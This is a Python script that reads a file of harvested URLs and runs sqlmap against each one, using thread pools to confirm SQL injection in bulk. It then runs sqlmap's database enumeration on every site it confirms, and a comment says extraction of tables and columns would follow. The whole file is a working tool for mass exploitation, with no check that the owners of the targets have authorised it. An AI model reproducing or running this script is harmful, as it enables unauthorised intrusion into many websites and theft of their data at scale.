import subprocess
import os
import time
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Initializes a lock for thread-safe printing and list appending
print_lock = Lock()

# Function which brings in the results data from another script
def import_results_data(path):
    # Opens the file with read
    with open(path, "r") as f:
        # Brings in the data as a list and strips whitespace
        data = [line.strip() for line in f.readlines() if line.strip()]
    # Returns the data
    return data

# Function to verify a single URL (Optimized for speed)
def verify_single_url(url, verified_urls):
    # Runs sqlmap with --smart and --batch to skip slow tests and prompts
    # Removed --flush-session to utilize local caching for speed
    result = subprocess.run(
        ["sqlmap", "-u", url, "--batch", "--smart", "--level=1", "--threads=5"], 
        capture_output=True, 
        text=True
    )

    # Uses the lock to prevent overlapping output
    with print_lock:
        # Checks the standard output for vulnerability confirmation
        if "is vulnerable" in result.stdout or "appears to be" in result.stdout:
            # Outputs the url is confirmed as vulnerable
            print(f"[+] Confirmed: {url}")
            # Adds the url to the verified urls list safely
            verified_urls.append(url)
        else:
            # Outputs the url was a false positive or not easily exploitable
            print(f"[-] Skipped/False Positive: {url}")

# Function to filter out any results using multiple threads
def filter_results_threaded(data):
    # Stores the verified urls
    verified_urls = []
    
    # Increased max_workers; I/O bound tasks can handle higher concurrency
    with ThreadPoolExecutor(max_workers=20) as executor:
        # Submits each url in the data to the thread pool
        for url in data:
            # Executes the verification function for the url
            executor.submit(verify_single_url, url, verified_urls)
            
    # Returns verified urls
    return verified_urls

# Function to process a single verified URL entirely
def process_target(url):
    # Uses the lock to announce the target
    with print_lock:
        # Outputs the current target being processed
        print(f"\n--- Starting Full Scan: {url} ---")

    # Runs sqlmap to get databases using internal threading for speed
    subprocess.run(["sqlmap", "-u", url, "--dbs", "--batch", "--threads=10"], capture_output=False)
    
    # Logic for extracting databases, tables, and columns would follow here...
    with print_lock:
        # Outputs that the specific target scan is complete
        print(f"[!] Finished scanning {url}")

# Main executable function
def main():
    # Logs the starting time
    start_time = time.perf_counter() 

    # Asks for the path of the results file
    results_path = input("[+] Please enter the results file path: ").strip()

    # Checks if the input is a file path
    if os.path.isfile(results_path):
        # Outputs that data is being imported
        print("[+] Importing data")
        # Function to bring in the results data
        raw_data = import_results_data(results_path)

        # Outputs that data is being filtered with threads
        print(f"[+] Filtering {len(raw_data)} targets...")

        # Stores the filtered verified urls using the threaded function
        verified_urls = filter_results_threaded(raw_data)

        # Creates a thread pool for full target processing
        # Kept at 5 to avoid overwhelming the network during deep scans
        with ThreadPoolExecutor(max_workers=5) as executor:
            # Loops over each verified url found
            for url in verified_urls:
                # Submits the full target scan to the pool
                executor.submit(process_target, url)
    else:
        # Outputs that the path provided was invalid
        print("[!] Invalid file path")

    # Gets end time and calculates the elapsed time
    elapsed = time.perf_counter() - start_time

    # Outputs the total time taken
    print(f"\n[âœ“] All tasks finished in {elapsed:.2f} seconds")

# Runs the main function
if __name__ == "__main__":
    # Calls the main function
    main()